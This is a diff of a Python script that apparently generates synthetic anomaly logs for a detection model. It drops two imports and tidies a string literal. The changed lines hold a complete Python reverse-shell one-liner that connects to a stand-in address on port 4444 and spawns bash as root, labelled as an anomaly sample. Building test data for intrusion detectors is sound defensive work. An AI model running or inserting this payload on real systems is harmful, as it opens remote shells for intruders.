@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 import sys
 import os
-import json
-import time
 import random
 import string
 import numpy as np
@@ -49,7 +47,7 @@ def generate_novel_anomalies(n=200):
     # Attack 2: Complex Python Payload
     for _ in range(int(n * 0.3)):
         logs.append({
-            "command": f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+            "command": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
             "username": "root", "dst_port": 22, "label": "anomaly"
         })
     # Attack 3: Novel SQLi
